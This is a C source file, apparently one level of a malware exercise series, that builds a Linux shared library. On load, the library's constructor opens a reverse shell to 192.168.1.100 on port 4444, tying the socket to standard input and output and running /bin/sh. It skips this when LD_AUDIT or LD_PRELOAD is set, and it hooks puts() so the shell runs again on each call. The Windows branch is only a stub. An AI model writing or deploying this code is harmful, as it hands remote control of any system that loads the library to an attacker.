/* Shared library on Linux; EXE on Windows that uses LoadLibrary/GetProcAddress */
#ifdef _WIN32
#include <stdio.h>
#include <windows.h>

int main(void) {
    HMODULE h = LoadLibraryA("kernel32.dll");
    if (h) {
        void (*pExit)(UINT) = (void (*)(UINT))GetProcAddress(h, "ExitProcess");
        (void)pExit;
    }
    /* Reverse shell pattern: would use Winsock + CreateProcess like level1 */
    return 0;
}
#else
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <dlfcn.h>

static void reverse_shell() __attribute__((constructor));

void reverse_shell() {
    int sock;
    struct sockaddr_in server;

    if(getenv("LD_AUDIT") || getenv("LD_PRELOAD")) {
        return;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);

    if(connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        execve("/bin/sh", NULL, NULL);
    }
}

int puts(const char *str) {
    int (*original_puts)(const char *);
    original_puts = dlsym(RTLD_NEXT, "puts");
    reverse_shell();
    return original_puts(str);
}
#endif
